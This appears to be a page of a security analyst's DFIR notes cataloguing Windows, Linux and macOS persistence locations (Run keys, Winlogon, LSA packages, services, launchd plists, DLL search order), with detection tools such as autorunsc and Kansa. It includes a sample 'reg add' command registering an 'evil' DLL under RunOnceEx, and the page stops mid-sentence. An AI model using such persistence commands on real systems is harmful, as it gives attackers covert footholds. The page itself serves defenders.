<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Techniques - Analyst</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <link rel="icon" href="https://bakerst221b.com/favicon.png">
  <link href="/css/style-classic.css"></link>
  
  
  <link rel="stylesheet" href="/css/style.min.564b5f4faf3af87992cb8ab298314448914c22dbdb3f2f9c584546b21b8d407c.css">
  

  

</head>

<body class='page page-default-single'>
  <div id="main-menu-mobile" class="main-menu-mobile">
  <ul>
    
    
    <li class="menu-item-home 🏡">
      <a href="/">
        <span>Home 🏡</span>
      </a>
    </li>
    
    <li class="menu-item-blog ✍️">
      <a href="/docs/blog">
        <span>Blog ✍️</span>
      </a>
    </li>
    
    <li class="menu-item-dfir 🔍">
      <a href="/docs/dfir">
        <span>DFIR 🔍</span>
      </a>
    </li>
    
    <li class="menu-item-crypto 🗝️">
      <a href="/docs/cryptography">
        <span>Crypto 🗝️</span>
      </a>
    </li>
    
    <li class="menu-item-reverse 🔧">
      <a href="/docs/reverse">
        <span>Reverse 🔧</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit 🧰">
      <a href="/docs/toolkit">
        <span>Toolkit 🧰</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting 🪤">
      <a href="/docs/thunting">
        <span>Threat Hunting 🪤</span>
      </a>
    </li>
    
    <li class="menu-item-about me 🧝🏽‍♀️">
      <a href="/docs/about">
        <span>About me 🧝🏽‍♀️</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference 📚">
      <a href="/docs/reference">
        <span>Tech Reference 📚</span>
      </a>
    </li>
    
  </ul>
</div>
  <div class="wrapper">
    <div class='header'>
  <div class="container">
    <div class="logo">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo.png" /></a>
    </div>
    <div class="logo-mobile">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
    </div>
    

    <div id="main-menu" class="main-menu">
  <ul>
    
    
    <li class="menu-item-home 🏡">
      <a href="/">
        <span>Home 🏡</span>
      </a>
    </li>
    
    <li class="menu-item-blog ✍️">
      <a href="/docs/blog">
        <span>Blog ✍️</span>
      </a>
    </li>
    
    <li class="menu-item-dfir 🔍">
      <a href="/docs/dfir">
        <span>DFIR 🔍</span>
      </a>
    </li>
    
    <li class="menu-item-crypto 🗝️">
      <a href="/docs/cryptography">
        <span>Crypto 🗝️</span>
      </a>
    </li>
    
    <li class="menu-item-reverse 🔧">
      <a href="/docs/reverse">
        <span>Reverse 🔧</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit 🧰">
      <a href="/docs/toolkit">
        <span>Toolkit 🧰</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting 🪤">
      <a href="/docs/thunting">
        <span>Threat Hunting 🪤</span>
      </a>
    </li>
    
    <li class="menu-item-about me 🧝🏽‍♀️">
      <a href="/docs/about">
        <span>About me 🧝🏽‍♀️</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference 📚">
      <a href="/docs/reference">
        <span>Tech Reference 📚</span>
      </a>
    </li>
    
  </ul>
</div>
    
    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
  <span class="hamburger-box">
    <span class="hamburger-inner"></span>
  </span>
</button>
    
    <div style="margin-left: 20pt;">
      <a href="/index.xml" type="application/rss+xml">
        <img src="/images/rss.png" alt="RSS Feed">
      </a>
    </div>
    
    <style>
      a[href="/index.xml"] {
        display: inline-block;
        vertical-align: middle;
        margin-right: 10px;
      }
    
      a[href="/index.xml"] img {
        height: 30px;
      }
    </style>
    
  </div>
</div>


    
    
    
    
    
    

    
    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
      <div class="row">
        <div class="col-12 col-md-3 mb-3">
          <div class="sidebar">
            
<div class="docs-menu">
  <p>
   <a href="/docs/dfir/investigation/artefacts/escalation-persistence/"> 👈🏼 Back to </br> 🪜 Persistence and Escalation </a>
  </p>
  <aside>
   <nav id="TableOfContents">
  <ul>
    <li><a href="#startup">Startup</a>
      <ul>
        <li><a href="#windows">Windows</a>
          <ul>
            <li><a href="#-btfm">📘 BTFM</a></li>
          </ul>
        </li>
        <li><a href="#linux">Linux</a></li>
        <li><a href="#macos">macOS</a>
          <ul>
            <li><a href="#login-items">Login Items</a></li>
            <li><a href="#programming-persistence">Programming persistence</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#boot">Boot</a>
      <ul>
        <li><a href="#windows-1">Windows</a>
          <ul>
            <li><a href="#flashing-bios">Flashing BIOS</a></li>
            <li><a href="#boot-execute">Boot execute</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#services">Services</a>
      <ul>
        <li><a href="#windows-2">Windows</a></li>
        <li><a href="#linux-1">Linux</a></li>
        <li><a href="#macos-1">macOS</a>
          <ul>
            <li><a href="#agents">Agents</a></li>
            <li><a href="#daemons">Daemons</a></li>
            <li><a href="#proxying">Proxying</a></li>
            <li><a href="#hijacking">Hijacking</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#tasks">Tasks</a>
      <ul>
        <li><a href="#windows-3">Windows</a>
          <ul>
            <li><a href="#-rtfm">📕 RTFM</a></li>
          </ul>
        </li>
        <li><a href="#linux-2">Linux</a></li>
        <li><a href="#macos-2">macOS</a>
          <ul>
            <li><a href="#cron">Cron</a></li>
            <li><a href="#at">At</a></li>
            <li><a href="#periodic">Periodic</a></li>
            <li><a href="#login-and-logout-hooks">Login and Logout Hooks</a></li>
            <li><a href="#-rtfm-1">📕 RTFM</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#policies">Policies</a>
      <ul>
        <li><a href="#windows-4">Windows</a></li>
      </ul>
    </li>
    <li><a href="#office">Office</a></li>
    <li><a href="#ipc">IPC</a>
      <ul>
        <li><a href="#windows-5">Windows</a>
          <ul>
            <li><a href="#shell-extension-handlers">Shell Extension Handlers</a></li>
            <li><a href="#com-hijack">COM Hijack</a></li>
            <li><a href="#extension-handler-hijacking">Extension Handler Hijacking</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#elevation-control-mechanism-abuse">Elevation Control Mechanism Abuse</a>
      <ul>
        <li><a href="#linux--macos">Linux &amp; macOS</a>
          <ul>
            <li><a href="#setuid-and-setgid"><code>setuid</code> and <code>setgid</code></a></li>
            <li><a href="#sudo-caching">Sudo caching</a></li>
            <li><a href="#authorizationexecutewithprivileges"><code>AuthorizationExecuteWithPrivileges</code></a></li>
          </ul>
        </li>
        <li><a href="#windows-6">Windows</a>
          <ul>
            <li><a href="#uac-abuse">UAC Abuse</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#tokens">Tokens</a></li>
    <li><a href="#kernel-modules-and-extentions">Kernel Modules and Extentions</a>
      <ul>
        <li><a href="#linux-3">Linux</a>
          <ul>
            <li><a href="#lkm">LKM</a></li>
            <li><a href="#xdg">XDG</a></li>
          </ul>
        </li>
        <li><a href="#macos-3">macOS</a>
          <ul>
            <li><a href="#kext">kext</a></li>
            <li><a href="#reopen">reopen</a></li>
          </ul>
        </li>
        <li><a href="#windows-7">Windows</a>
          <ul>
            <li><a href="#lsass-driver">LSASS driver</a></li>
            <li><a href="#shortcuts">Shortcuts</a></li>
            <li><a href="#port-monitors">Port Monitors</a></li>
            <li><a href="#print-processors">Print Processors</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
 </aside>
</div>



          </div>
        </div>
        <div class="col-12 col-md-9">
          
<h1 class="title">Techniques</h1>
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    <div class="meta">
      
      

      
      

      
    </div>
    
    <b>Created:</b> 10.05.2023
    <br />

    

  </header>


  <div class="content" itemprop="articleBody">
    <p><em>This is about &hellip; .</em></p>
<p>🔖 <a href="https://attack.mitre.org/techniques/T1547/014"><br>
.014</a></p>
<p><a href="https://attack.mitre.org/techniques/T1547/014">Active Setup</a> (Not yet processed)</p>
<h2 id="startup">Startup</h2>
<h3 id="windows">Windows</h3>
<p>The list of reg keys that could be abused for persistence and escalation:
the current user is <code>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> (default)</p>
<ul>
<li>all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> (default)</li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> (default)</li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> (default)</li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> (default)</li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> (default)</li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d &quot;C:\temp\evil[.]dll&quot;</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> (when specified in the policy settings)</li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> (when specified in the policy settings)</li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> </li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.</li>
<li>multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.</li>
<li>Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of <code>&quot;Authentication Packages&quot;=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.</li>
<li>Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code>. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.</li>
<li>Registry entries in <code>HKLM\Software[\Wow6432Node\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon.
<ul>
<li><code>Winlogon\Notify</code> - points to notification package DLLs that handle Winlogon events</li>
<li><code>Winlogon\Userinit</code> - points to userinit.exe, the user initialization program executed when a user logs on</li>
<li><code>Winlogon\Shell</code> - points to explorer.exe, the system shell executed when a user logs on</li>
</ul>
</li>
<li><code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code>, <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code> - load into LSA space, meaning having access to unencrypted password info.</li>
</ul>
<h4 id="-btfm">📘 BTFM</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">autorunsc -v <span class="o">[</span>options<span class="o">]</span> &gt; result.csv
</span></span></code></pre></div><h3 id="linux">Linux</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/systemd/system  
</span></span><span class="line"><span class="cl">/usr/lib/systemd/system 
</span></span><span class="line"><span class="cl">/etc/init*
</span></span></code></pre></div><h3 id="macos">macOS</h3>
<h4 id="login-items">Login Items</h4>
<p><code>System Preferences -&gt; Users &amp; Groups -&gt; Login Items</code>. Additional: SDF podcast.</p>
<p>How to determine if it&rsquo;s malicious? Well, the sure way is only to reverse engineer it, but it is time consuming. So, you need to narrow down the candidates first. There are a couple of indicators that are commonly seen in malware.</p>
<blockquote>
<p>Login items run within the user’s desktop session, inheriting the user’s permissions, and start automatically at user login. Due to this afforded persistence, Mac malware will commonly install itself as a login item. You can find examples of this technique in malware like Kitm, NetWire, and WindTail. Wardle, Patrick. The Art of Mac Malware (p. 24). No Starch Press. Kindle Edition.</p>
</blockquote>
<blockquote>
<p>❗️ macOS doesn’t readily show the full path to a persisted login item in its interface (unless you hover over the item for a few seconds)</p>
</blockquote>
<p>👻 <code>backgroundtaskmanagementagent</code> is a daemon that is running in the background and thus also manages login items. The list of the items is stored in a file ⚙️  named <code>backgrounditems.btm</code>.</p>
<h4 id="programming-persistence">Programming persistence</h4>
<p>⚙️  <code>LSSharedFileListCreate</code> (returns the reference to the list) -&gt; <code>LSSharedFileListInsertItemURL</code> (adds a new item, requires a full path to the item).</p>
<p>To view the APIs used run <code>nm WindTail/Final_Presentation.app/Contents/MacOS/usrnode</code>. Seeing the above two APIs in the list suggest this persistence mechanism was used by the binary.</p>
<p>🥷🏼 (stealthy) <code>SMLoginItemSetEnabled</code> - the “Modern Login Items” blog post or Apple’s documentation on the topic. This allows application-specific helper login items. They don&rsquo;t show up in the Preferences. Those items are stored in <code>LoginItems</code> subdirectory of an application’s bundle.</p>
<h2 id="boot">Boot</h2>
<h3 id="windows-1">Windows</h3>
<h4 id="flashing-bios">Flashing BIOS</h4>
<p>Update BIOS with the malicious code included. More <a href="https://www.techtarget.com/searchsecurity/definition/BIOS-rootkit-attack">here</a>.</p>
<h4 id="boot-execute">Boot execute</h4>
<p>Not sure what that means <a href="https://www.tenable.com/plugins/nessus/70615">https://www.tenable.com/plugins/nessus/70615</a>. Could be <a href="https://github.com/beahunt3r/Windows-Hunting/blob/master/Persistence/Registry%20Autoruns/Boot%20Execute">this</a>:</p>
<blockquote>
<p>🔑 <code>HKLM\System\CurrentControlSet\Control\ServiceControlManagerExtension</code>
🔑 <code>HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute</code>
🔑 <code>HKLM\System\CurrentControlSet\Control\Session Manager\Execute</code>
🔑 <code>HKLM\System\CurrentControlSet\Control\Session Manager\S0InitialCommand</code>
🔑 <code>HKLM\System\CurrentControlSet\Control\Session Manager\SetupExecute</code></p>
</blockquote>
<h2 id="services">Services</h2>
<h3 id="windows-2">Windows</h3>
<p>🔑 <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The executable needs to have certain code and permissions for service behaviour, and there are three options to accomplish that:</p>
<ol>
<li>New service. If <code>Start</code> value = <code>0x2</code> (see 🔑 above), start the service at boot. Example 🦠: APT1, RIP listener service. ⚒️<code>sc [queryex|qc|qprivs|qtriggerinfo]</code>.</li>
<li>Hijacking, aka Replacement. Required modifications to some existing services. Usually, some rarely used one. Example 🦠: GlassRAT.</li>
<li>Service failure recovery. Load something 🦠bad when something good and service-like 👼 crashes. You can define what to do if a certain service crashes; usually it&rsquo;s restarting the service. However, this setting can be changed to launch another executable. ⚒️ Kansa Powershell Framework (<code>Get_SvcFail.ps1</code> script), event logs.</li>
</ol>
<p>Kansa has several scripts to stack services. You can also use the general one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="nb">Get-LogparserStack</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-FilePattern</span> <span class="p">*</span><span class="n">SvcAll</span><span class="p">.</span><span class="n">csv</span> <span class="n">-Delimiter</span> <span class="s2">&#34;,&#34;</span> <span class="n">-Direction</span> <span class="n">asc</span> <span class="n">-OutFile</span> <span class="nb">SvcAll-workstation</span><span class="n">-stack</span><span class="p">.</span><span class="n">csv</span>
</span></span></code></pre></div><p>To do the same job with PowerShell:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$csvFiles</span> <span class="p">=</span> <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="s2">&#34;.\*SvcAll.csv&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="p">=</span> <span class="p">@()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$csvFile</span> <span class="k">in</span> <span class="nv">$csvFiles</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="p">=</span> <span class="nb">Import-Csv</span> <span class="n">-Path</span> <span class="nv">$csvFile</span><span class="p">.</span><span class="n">FullName</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="p">+=</span> <span class="nv">$data</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="p">[</span><span class="n">0</span><span class="p">]</span> <span class="p">|</span> <span class="nb">Get-Member</span> <span class="n">-MemberType</span> <span class="n">NoteProperty</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span>
</span></span><span class="line"><span class="cl"><span class="nv">$groupedData</span> <span class="p">=</span> <span class="nv">$result</span> <span class="p">|</span> <span class="nb">Group-Object</span> <span class="n">-Property</span> <span class="n">Name</span><span class="p">,</span> <span class="n">PathName</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Count</span><span class="p">,</span> <span class="n">Name</span><span class="p">,</span> <span class="n">PathName</span><span class="p">,</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">&#34;PC&#34;</span><span class="p">;</span> <span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Group</span><span class="p">.</span><span class="s1">&#39;PSComputerName&#39;</span><span class="p">}}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$groupedData</span> <span class="p">|</span> <span class="nb">Export-Csv</span> <span class="n">-Path</span> <span class="s2">&#34;result.csv&#34;</span> <span class="n">-NoTypeInformation</span>
</span></span></code></pre></div><h3 id="linux-1">Linux</h3>
<p>Unused services. To disable a service:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo systemctl stop &lt;servicename&gt;
</span></span><span class="line"><span class="cl">sudo systemctl disable &lt;servicename&gt;
</span></span></code></pre></div><h3 id="macos-1">macOS</h3>
<p>⚙️ The most relevant keys in a plist would be the following:</p>
<ol>
<li>Label</li>
<li>Arguments</li>
<li>RunAtLoad - persistence.</li>
<li>PathState (<a href="https://macadmins.psu.edu/files/2012/11/psumacconf2012-launchd.pdf">https://macadmins.psu.edu/files/2012/11/psumacconf2012-launchd.pdf</a>)</li>
<li>StartCalendarInterval (<a href="https://macadmins.psu.edu/files/2012/11/psumacconf2012-launchd.pdf">https://macadmins.psu.edu/files/2012/11/psumacconf2012-launchd.pdf</a>)</li>
</ol>
<p>👻  <code>launchd</code> process is responsible for running these items. 📚 Reference: A Launch tutorial, <a href="https://www.launchd.info/;">https://www.launchd.info/;</a> &ldquo;Getting Started with Launchd for Sys Admins,&rdquo; Penn State MacAdmins Conference 2012, <a href="https://macadmins.psu.edu/files/2012/11/psumacconf2012-launchd.pdf">https://macadmins.psu.edu/files/2012/11/psumacconf2012-launchd.pdf</a>.</p>
<p>An example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE plist PUBLIC ...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&#34;1.0&#34;</span><span class="nt">&gt;&lt;dict&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;key&gt;</span>Label<span class="nt">&lt;/key&gt;</span>    
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;string&gt;</span>com.foo.bar<span class="nt">&lt;/string&gt;</span>   
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;key&gt;</span>ProgramArguments<span class="nt">&lt;/key&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;array&gt;</span>        
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;string&gt;</span>/Users/user/launchItem<span class="nt">&lt;/string&gt;</span>       
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;string&gt;</span>argument 1<span class="nt">&lt;/string&gt;</span>    
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;string&gt;</span>argument 2<span class="nt">&lt;/string&gt;</span>    
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;/array&gt;</span>    
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;key&gt;</span>RunAtLoad<span class="nt">&lt;/key&gt;</span>    
</span></span><span class="line"><span class="cl">1 <span class="nt">&lt;true/&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dict&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/plist&gt;</span>
</span></span></code></pre></div><p>Wardle, Patrick. The Art of Mac Malware (p. 27). No Starch Press. Kindle Edition.</p>
<h4 id="agents">Agents</h4>
<p>Run once the user is logged in. Do not have root permissions. They may interract with the user session.</p>
<p>The plists can be found here:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/Library/LaunchAgents 
</span></span><span class="line"><span class="cl">~/Library/LaunchAgents
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># to read the file run</span>
</span></span><span class="line"><span class="cl">plutil -p &lt;path to plist&gt;
</span></span><span class="line"><span class="cl">defaults <span class="nb">read</span> &lt;path to plist&gt;
</span></span></code></pre></div><h4 id="daemons">Daemons</h4>
<p>They usually run before the user logs in. Do not require user interaction. They run with 👑 root permissions.</p>
<p>The plists can be found here:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/Library/LaunchDaemons
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># to read the file run</span>
</span></span><span class="line"><span class="cl">plutil -p &lt;path to plist&gt;
</span></span><span class="line"><span class="cl">defaults <span class="nb">read</span> &lt;path to plist&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Libs</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### Windows</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">For some of the injection techniques <span class="o">(</span>low-level ones<span class="o">)</span>, see the <span class="o">[</span>injections<span class="o">](</span>/docs/reverse/malware-analysis/injections<span class="o">)</span> article.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#### DLL Sideloading</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Following is the search order <span class="k">for</span> modern Windows systems:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1. Manifest <span class="o">(</span><span class="k">if</span> the application provides an absolute path to the <span class="sb">`</span>dll<span class="sb">`</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">2. Search the RAM <span class="k">for</span> the same module. No searching.
</span></span><span class="line"><span class="cl">3. Dlls in the same direction as the executable that loads it
</span></span><span class="line"><span class="cl">4. <span class="sb">`</span>KnowDLLs<span class="sb">`</span> list <span class="sb">`</span>HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\W</span>OW<span class="sb">`</span>  or <span class="sb">`</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\S</span>ession Manager<span class="se">\K</span>nownDLLs<span class="sb">`</span> <span class="o">([</span>docs<span class="o">](</span>KnowDLLs<span class="sb">`</span> list <span class="sb">`</span>HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\W</span>OW<span class="sb">`</span><span class="o">))</span>. So, <span class="k">if</span> the dll is in the list, the link from the registry is used, and there is no search conducted. 
</span></span><span class="line"><span class="cl">6. Application<span class="s1">&#39;s loading directory
</span></span></span><span class="line"><span class="cl"><span class="s1">7. `C:\Windows\System32`
</span></span></span><span class="line"><span class="cl"><span class="s1">8. `C:\Windows\system`
</span></span></span><span class="line"><span class="cl"><span class="s1">9. `C:\Windows`
</span></span></span><span class="line"><span class="cl"><span class="s1">10. Application&#39;</span>s registered App Paths directories ❓
</span></span><span class="line"><span class="cl">11. <span class="sb">`</span>PATH<span class="sb">`</span> env variable
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; ❗️ If a DLL has dependencies, the system searches <span class="k">for</span> the dependent DLLs as <span class="k">if</span> they were loaded with just their module names. This is <span class="nb">true</span> even <span class="k">if</span> the first DLL was loaded by specifying a full path. <span class="o">[[</span>1<span class="o">](</span>https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching<span class="o">)]</span> So, that means that we can make a side-loading attack on <span class="s2">&#34;a side-loaded `dll`&#34;</span>!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; ❓Not sure about the different paths specified <span class="k">for</span> the KnowDlls entries. This might be due to the different OS versions. See <span class="o">[</span>here<span class="o">](</span>http://stuff.is-a-geek.net/OnlineDocs/Microsoft/NTmisc/Troubleshooting%20NTVDM%20and%20WOW%20startup%20problems.htm<span class="o">)</span>:
</span></span><span class="line"><span class="cl">&gt; 
</span></span><span class="line"><span class="cl">&gt; For 16-bit apps, Windows NT uses KnownDLLs to implicitly and explicitly load DLLs. The value is at <span class="sb">`</span>HKEY_LOCAL_MACHINE<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\W</span>OW<span class="sb">`</span>. At this key, <span class="sb">`</span>KnownDLLs<span class="sb">`</span> is a <span class="nb">type</span> <span class="sb">`</span>REG_SZ<span class="sb">`</span> value which lists the 8.3 DLL names, separated by spaces. Without a <span class="sb">`</span>KnownDLLs<span class="sb">`</span> entry, <span class="sb">`</span>WOW<span class="sb">`</span> searches: 
</span></span><span class="line"><span class="cl">&gt; 1. The current directory.
</span></span><span class="line"><span class="cl">&gt; 2. The <span class="sb">`</span>%SystemRoot%<span class="sb">`</span> directory.
</span></span><span class="line"><span class="cl">&gt; 3. The <span class="sb">`</span>%SystemRoot%<span class="se">\S</span>YSTEM<span class="sb">`</span> directory.
</span></span><span class="line"><span class="cl">&gt; 4. The <span class="sb">`</span>%SystemRoot%<span class="se">\S</span>YSTEM32<span class="sb">`</span> directory.
</span></span><span class="line"><span class="cl">&gt; 5. The <span class="sb">`</span>.exe<span class="sb">`</span> file directory.
</span></span><span class="line"><span class="cl">&gt; 6. The directories in your <span class="sb">`</span>Path<span class="sb">`</span> environment variable.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">With the KnownDLLs entry, WOW only searches the %SystemRoot%<span class="se">\S</span>YSTEM32 directory.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The order depends also on the <span class="sb">`</span>SafeDllSearchMode<span class="sb">`</span> <span class="o">(</span>🔑 <span class="sb">`</span>HKLM<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\S</span>ession Manager<span class="se">\S</span>afeDllSearchMode<span class="sb">`</span><span class="o">)</span>.  Here is the quote from the <span class="o">[</span>docs<span class="o">](</span>https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#standard-search-order-for-desktop-applications<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;If **SafeDllSearchMode** is enabled ✅, the search order is as follows:
</span></span><span class="line"><span class="cl">&gt;1. The directory from which the application loaded.
</span></span><span class="line"><span class="cl">&gt;2. The system directory. Use the <span class="o">[</span>**GetSystemDirectory**<span class="o">](</span>https://learn.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya<span class="o">)</span> <span class="k">function</span> to get the path of this directory.
